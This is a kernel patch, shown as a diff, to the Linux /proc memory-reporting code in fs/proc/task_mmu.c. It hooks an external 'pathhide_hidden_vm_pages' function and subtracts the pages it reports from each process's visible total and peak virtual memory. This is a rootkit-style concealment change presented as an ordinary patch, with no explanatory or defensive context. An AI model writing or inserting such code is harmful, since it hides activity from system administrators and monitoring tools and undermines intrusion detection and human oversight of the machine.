@@ -1,0 +1,40 @@
+--- a/fs/proc/task_mmu.c
++++ b/fs/proc/task_mmu.c
+@@ -41,6 +41,8 @@
+ {
+ 	unsigned long text, lib, swap, anon, file, shmem;
+ 	unsigned long hiwater_vm, total_vm, hiwater_rss, total_rss;
++	extern unsigned long pathhide_hidden_vm_pages(struct mm_struct *mm);
++	unsigned long ph_hidden = pathhide_hidden_vm_pages(mm);
+ 
+ 	anon = get_mm_counter(mm, MM_ANONPAGES);
+ 	file = get_mm_counter(mm, MM_FILEPAGES);
+@@ -56,6 +58,8 @@
+ 	hiwater_vm = total_vm = mm->total_vm;
+ 	if (hiwater_vm < mm->hiwater_vm)
+ 		hiwater_vm = mm->hiwater_vm;
++	total_vm -= min(total_vm, ph_hidden);
++	hiwater_vm -= min(hiwater_vm, ph_hidden);
+ 	hiwater_rss = total_rss = anon + file + shmem;
+ 	if (hiwater_rss < mm->hiwater_rss)
+ 		hiwater_rss = mm->hiwater_rss;
+@@ -98,13 +102,18 @@
+ 			 unsigned long *shared, unsigned long *text,
+ 			 unsigned long *data, unsigned long *resident)
+ {
++	extern unsigned long pathhide_hidden_vm_pages(struct mm_struct *mm);
++	unsigned long ph_hidden = pathhide_hidden_vm_pages(mm);
++	unsigned long ph_total_vm = mm->total_vm;
++
+ 	*shared = get_mm_counter(mm, MM_FILEPAGES) +
+ 			get_mm_counter(mm, MM_SHMEMPAGES);
+ 	*text = (PAGE_ALIGN(mm->end_code) - (mm->start_code & PAGE_MASK))
+ 								>> PAGE_SHIFT;
+ 	*data = mm->data_vm + mm->stack_vm;
+ 	*resident = *shared + get_mm_counter(mm, MM_ANONPAGES);
+-	return mm->total_vm;
++	ph_total_vm -= min(ph_total_vm, ph_hidden);
++	return ph_total_vm;
+ }
+ 
+ #ifdef CONFIG_NUMA
